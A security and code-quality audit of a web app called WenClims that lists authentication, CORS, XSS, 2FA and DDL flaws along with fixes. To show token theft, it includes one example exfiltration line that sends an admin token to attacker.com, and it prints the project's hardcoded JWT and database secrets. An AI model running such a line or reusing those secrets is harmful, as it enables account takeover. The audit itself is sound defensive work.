## 1. CRITICAL Security Risks

---

### CRITICAL-01: Real JWT Secrets Hardcoded in Source Code
**File:** `server/src/routes/auth.ts` (Line 12-13) and `server/src/middleware/auth.ts` (Line 16)

**Problem:**
```typescript
// auth.ts - Line 12 (DANGEROUS!)
const JWT_SECRET = process.env.JWT_SECRET || 'wenclims_super_secret_jwt_access_key_2026_x9k2';
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || 'wenclims_super_secret_jwt_refresh_key_2026_p4m8';
```
The fallback strings are real secrets. If `JWT_SECRET` environment variable is missing in production
(very common mistake for first-time deployers), the server silently uses these hardcoded strings.
**Anyone who reads your GitHub code can then forge any JWT token** and log in as super_admin without a password.

**Risk Level:** CRITICAL — Complete authentication bypass possible.

**Fix (remember for later):**
- Remove the fallback strings completely
- Make the app crash on startup if `JWT_SECRET` is missing
- Use a random 64-character secret generated by: `openssl rand -base64 64`

---

### CRITICAL-02: Real `.env` File Has Weak Secrets
**File:** `server/.env`

**Problem:**
```
DB_PASSWORD=admin123                               <- EXTREMELY WEAK!
JWT_SECRET=wenclims_super_secret_jwt_access_key_2026_x9k2  <- NOT RANDOM!
JWT_REFRESH_SECRET=wenclims_super_secret_jwt_refresh_key_2026_p4m8
COOKIE_SECRET=wenclims_cookie_secret_key_98234
```
- `DB_PASSWORD=admin123` — extremely weak, dictionary attack will crack this in seconds
- The JWT secrets look long but are predictable/structured strings, not truly random
- `admin123` for PostgreSQL is a textbook default password that every attacker tries first

**Risk Level:** CRITICAL — Database & all user accounts compromised if server is exposed.

---

### CRITICAL-03: Admin JWT Token Stored in localStorage
**File:** `admin/src/services/api.ts` (Line 7, 29-30)

**Problem:**
```typescript
const token = localStorage.getItem('wenclims_admin_token');
// And on logout error:
localStorage.removeItem('wenclims_admin_token');
```
Storing JWT in `localStorage` is a well-known XSS vulnerability. If any JavaScript injection
happens on the admin page (even from a third-party library), the attacker can steal the admin
token with just one line:
```javascript
fetch('https://attacker.com/?t=' + localStorage.getItem('wenclims_admin_token'))
```

**Risk Level:** CRITICAL — Admin account full takeover via XSS.

**Fix:** Use `httpOnly` cookies for the access token, same as you already do for refresh tokens.
Your server already supports `credentials: 'include'` in fetch calls.

---

### CRITICAL-04: Access Token Lifetime is 7 Days (Too Long)
**File:** `server/src/routes/auth.ts` (Line 65-69)

**Problem:**
```typescript
// The comment even says "Long-lived" which is the wrong intention!
const accessToken = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '7d' });
const refreshToken = jwt.sign({ id: user.id }, JWT_REFRESH_SECRET, { expiresIn: '7d' });
```
Your own security guide says: "short-lived JWT access tokens (15 min)". You have 7 days instead.
If an admin token is stolen, the attacker has a full 7-day window to abuse it. There is no token
revocation mechanism (no Redis blacklist), so even after logout the old token still works.

**Interesting bug:** The `/refresh` endpoint correctly uses `15m`, but the `/login` endpoint
issues `7d` tokens. This means the refresh flow is never actually needed/used.

**Risk Level:** CRITICAL for admin tokens — 7-day exposure window.

---

### CRITICAL-05: No Token Blacklist / Revocation on Logout
**File:** `server/src/routes/auth.ts` (Line 126-132)

**Problem:**
```typescript
router.post('/logout', authenticateToken, async (req, res) => {
  // Only clears the cookie — but the JWT itself is still valid for 7 more days!
  res.clearCookie('refreshToken');
  return res.json({ message: 'Logged out successfully.' });
});
```
After logout, the access token stored in localStorage remains cryptographically valid for 7 days.
An attacker who captured the token during the session continues to have full admin access.

**Risk Level:** CRITICAL — Logout is fake. Tokens keep working after logout.

## 2. HIGH Severity Issues

---

### HIGH-01: CORS Fallback Allows ALL Origins
**File:** `server/src/index.ts` (Line 37-43)

**Problem:**
```typescript
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(null, true); // "Allow dev tools / postman" — THIS IS WRONG IN PRODUCTION!
    }
  },
  credentials: true,
}));
```
The `else` branch ALSO calls `callback(null, true)`, meaning every origin in the world is allowed.
This completely defeats CORS protection. A malicious website can make authenticated requests to
your API on behalf of a logged-in admin.

**Risk Level:** HIGH — CSRF attack vector wide open.

---

### HIGH-02: DDL Statements (ALTER TABLE) in Request Handlers
**Files:** `server/src/routes/public.ts` (Lines 100-101), `server/src/routes/adminUsers.ts` (Lines 21-25), `server/src/routes/adminMedia.ts` (Lines 152-157)

**Problem:**
```typescript
// In public.ts — runs on EVERY team API request:
await query('ALTER TABLE team_members ADD COLUMN IF NOT EXISTS show_on_home BOOLEAN DEFAULT FALSE');
await query('ALTER TABLE team_members DROP CONSTRAINT IF EXISTS team_members_team_check');

// In adminUsers.ts — runs on every user list request:
async function ensureUsersTableSchema() {
  await query('ALTER TABLE users DROP CONSTRAINT IF EXISTS users_role_check');
  await query('ALTER TABLE users ALTER COLUMN role TYPE VARCHAR(50)');
}
```
This is extremely bad practice for multiple reasons:
1. DDL statements lock tables briefly — running on every API call causes table locks under traffic
2. It's dropping database CHECK constraints — these exist to enforce data integrity
3. Schema changes should NEVER happen at runtime via application code
4. It exposes your schema structure

**Risk Level:** HIGH — Performance degradation, data corruption risk, information leakage.

---

### HIGH-03: Server Routes Mounted Twice / Admin Routes on Public Path
**File:** `server/src/index.ts` (Lines 67-68 and 78-79)

**Problem:**
```typescript
app.use('/api/v1/public', publicRoutes);
app.use('/api/v1', publicRoutes); // DUPLICATE — every public route exists at two URLs!

app.use('/api/v1/admin/system', adminSystemRoutes);
app.use('/api/v1/system', adminSystemRoutes); // Admin routes accessible from non-admin path!
```
The double mounting creates confusing access control boundaries and future security bugs.

**Risk Level:** HIGH — Confusing architecture, potential future access control bugs.

---

### HIGH-04: Body Size Limit is 50MB
**File:** `server/src/index.ts` (Lines 49-50)

**Problem:**
```typescript
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
```
50MB JSON body limit is too large. An attacker can send repeated 50MB payloads to exhaust
server memory and crash the application (Denial of Service attack). You're not uploading files
via JSON, so there's no reason for 50MB.

**Risk Level:** HIGH — DoS vulnerability.

---

### HIGH-05: No Input Sanitization for HTML/Rich Text (Stored XSS)
**File:** `server/src/utils/validation.ts` (Lines 15-16)

**Problem:**
```typescript
body: z.string().optional(),    // Blog body — accepts raw HTML! No sanitization!
excerpt: z.string().optional(), // Also raw HTML
```
The blog body is stored raw without HTML sanitization. Your security guide explicitly warns about
this: "sanitize HTML on save with DOMPurify." If an editor posts a blog with `<script>` in
the body, that script could execute when an admin views the blog preview (Stored XSS).

**Risk Level:** HIGH — Stored XSS attack via blog content.

---

### HIGH-06: Error Message Leaks Internal Error Details
**File:** `server/src/routes/adminUsers.ts` (Line 116)

**Problem:**
```typescript
return res.status(500).json({ error: error?.message || 'Failed to create user account.' });
```
`error.message` from a database error can expose internal information like table structure,
column names, database server version, and file paths. Your security guide says:
"Return generic error messages to clients — log the detailed stack trace server-side only."

**Risk Level:** HIGH — Information disclosure to potential attackers.

---

### HIGH-07: Database Backup Route Dumps All User Data
**File:** `server/src/routes/adminSystem.ts` (Lines 103-135)

**Problem:**
The backup route sends all user data over HTTP in a single JSON download. If this is intercepted,
all user accounts are exposed. Also no rate limiting on how often backups can be triggered.

**Risk Level:** HIGH — User data exfiltration risk.

## 3. MEDIUM Severity Issues

---

### MED-01: TOTP 2FA Can Be Bypassed By Omitting the Field
**File:** `server/src/routes/auth.ts` (Lines 44-53)

**Problem:**
```typescript
// This only checks TOTP IF both conditions are true:
// 1. user has totp_secret configured
// 2. the request INCLUDES a totp field
// But if totp_secret is set but NO totp is sent → login STILL SUCCEEDS!
if (user.totp_secret && totp) {
  // verify...
}
```
Correct logic: if `totp_secret` is set → `totp` is REQUIRED. Not sending it = `401` error.

**Risk Level:** MEDIUM — 2FA can be bypassed.

---

### MED-02: CSP Allows 'unsafe-inline' Scripts
**File:** `client/index.html` (Line 49)

**Problem:**
```html
script-src 'self' 'unsafe-inline'
```
`'unsafe-inline'` in `script-src` completely defeats the XSS protection that CSP was designed
for. An attacker who can inject any HTML can execute scripts.

**Risk Level:** MEDIUM — CSP protection largely nullified.

---

### MED-03: No Stricter Rate Limiting on Destructive Admin Actions

The global rate limiter is 100 requests/minute. An automated script could delete all content
within this limit in seconds. Destructive endpoints (DELETE) need stricter limits.

**Risk Level:** MEDIUM.

---

### MED-04: Author Permission Check Uses Name String Comparison
**File:** `server/src/routes/adminMedia.ts` (Lines 108-110)

**Problem:**
```typescript
const isAuthor =
  existing.rows[0].author_id === req.user?.id ||
  existing.rows[0].author_name?.toLowerCase().trim() === req.user?.name?.toLowerCase().trim();
```
If two users share the same display name, they can edit each other's content. An attacker who
changes their display name to match another user's name can edit their content.

**Risk Level:** MEDIUM — Privilege escalation via name spoofing.

---

### MED-05: No Pagination on Admin Data Endpoints

Most admin endpoints return ALL rows with no pagination. As content grows, these will return
huge payloads causing memory issues and slow responses.

**Risk Level:** MEDIUM — Performance degradation.

---

### MED-06: Admin API Base URL Hardcoded to localhost — Will Break in Production!
**File:** `admin/src/services/api.ts` (Line 1)

**Problem:**
```typescript
const API_BASE_URL = 'http://localhost:5000/api/v1'; // NO env variable!
```
Unlike the client which uses `import.meta.env.VITE_API_BASE_URL`, the admin panel has the
localhost URL hardcoded. When you deploy to production, the admin panel will still try to
connect to `localhost:5000` — which doesn't exist on the live server.

**THIS WILL MAKE YOUR ADMIN PANEL COMPLETELY BROKEN IN PRODUCTION.**

**Risk Level:** MEDIUM-HIGH — Functionality breaking, not just security.

---

### MED-07: No CSRF Token for State-Changing Requests

The admin uses JWT in `localStorage` + `Authorization: Bearer` header which avoids classic
cookie-based CSRF. However, combined with the open CORS (HIGH-01), cross-origin attacks
are still possible.

**Risk Level:** MEDIUM.

---

### MED-08: Password Minimum Length is Only 6 Characters
**Files:** `server/src/utils/validation.ts` (Line 6) and `adminUsers.ts` (Line 15)

**Problem:**
```typescript
password: z.string().min(6, 'Password must be at least 6 characters long'),
```
6 characters is extremely weak for admin accounts. NIST recommends minimum 12-15 characters
for privileged accounts.

**Risk Level:** MEDIUM.

## 4. Code Quality Mistakes

---

### CODE-01: Inconsistent Role System Across Files

| File | Roles Defined |
|------|--------------|
| `middleware/auth.ts` (TypeScript type) | `'super_admin' \| 'editor'` |
| `adminUsers.ts` (zod schema) | `'super_admin', 'admin', 'member', 'editor'` |
| `schema.sql` | `VARCHAR(50)` with no constraint (constraint was dropped!) |
| `requireRole()` function | Only accepts `'super_admin' \| 'editor'` |

The role system is inconsistently defined across files. Pick one definition and use it everywhere.

---

### CODE-02: `any` Type Used Extensively in Admin API Service

```typescript
createMedia: (item: any) =>      // Should have a proper TypeScript type!
updateProject: (id: string, proj: any) => // Should have a proper type!
```
TypeScript is being used, but `any` types appear everywhere in `admin/src/services/api.ts`.
This defeats the purpose of TypeScript.

---

### CODE-03: Same Component File Imported Under Multiple Route Variables

```typescript
// In client/src/App.tsx:
const PublicationsHub = lazy(() => import('./components/publications/PublicationsHub'));
const ResearchPage    = lazy(() => import('./components/publications/PublicationsHub')); // SAME!
const ReportsPage     = lazy(() => import('./components/publications/PublicationsHub')); // SAME!
```
Multiple route variables import the exact same component file. This suggests the sub-routes
may all be showing the same content without actually filtering by type.

---

### CODE-04: `alert()` Used in Admin Panel for Session Expiry

```typescript
alert('Your admin session has expired. Please log in again to continue.');
```
`alert()` is a browser-blocking popup. It pauses all JavaScript and looks unprofessional.
Use a toast/notification component instead.

---

### CODE-05: No React Error Boundary Component

There is no Error Boundary in the React apps. If any component throws an unhandled error,
the entire site goes blank with no fallback UI. Add an error boundary at the app root level.

---

### CODE-06: README.md is Outdated / Wrong

The README still says:
- "GDC Larkana LMS Website" (this is WenClims now)
- Frontend at `localhost:3000` (actual is `5173`)
- Wrong API endpoints (`/api/courses`, `/api/events` — these don't exist)
- No mention of the admin panel at all

### CODE-07: DB Connection Fallbacks to Insecure Defaults

```typescript
// server/src/db/index.ts
password: process.env.DB_PASSWORD || 'postgres',
```
If the env var is missing, it silently falls back to the default PostgreSQL password.
Same issue as CRITICAL-01 — silent dangerous fallbacks.

---

### CODE-08: No `.gitignore` Inside `server/` Folder

The root `.gitignore` should cover subdirectories, but in a monorepo it's safer to have
per-package `.gitignore` files. More importantly: verify the `.env` was never committed:
```bash
git log --all --full-history -- server/.env
```
If any output appears — the secrets were committed and are in your git history.

---

### CODE-09: DDL at Runtime (Also a Code Quality Issue)

Running `ALTER TABLE`, `DROP CONSTRAINT` inside normal API request handlers on every request
is a serious architectural mistake. Use database migration scripts run once at deployment.

## 5. Architecture Observations

---

### ARCH-01: Three `package.json` Files — This is NORMAL, Not a Mistake!

**Your Question: "I'm confused about too many package.json files"**

This is called a **monorepo** structure. It's intentional and correct:

| File | Purpose |
|------|---------|
| Root `package.json` | Only holds `concurrently` — runs all apps together with `npm run dev` |
| `client/package.json` | Frontend (React, GSAP, Lenis, amcharts) dependencies |
| `admin/package.json` | Admin panel (separate React app) dependencies |
| `server/package.json` | Backend (Express, PostgreSQL, bcrypt, JWT) dependencies |

Each sub-app is independent. **This is fine and the correct way to structure this project.**

---

### ARCH-02: No File Upload System Yet

The schema has `cover_image TEXT`, `photo TEXT` fields — stored as URL strings.
There's no file upload endpoint or storage system. When you add file uploads,
plan carefully per the security guide's file upload section.

---

### ARCH-03: Public API Has No Authentication — Intentional But Consider Rate Limits

`/api/v1/` routes expose ALL published data without authentication. Anyone can scrape your
entire database. Consider stricter rate limiting per IP for bulk data access.
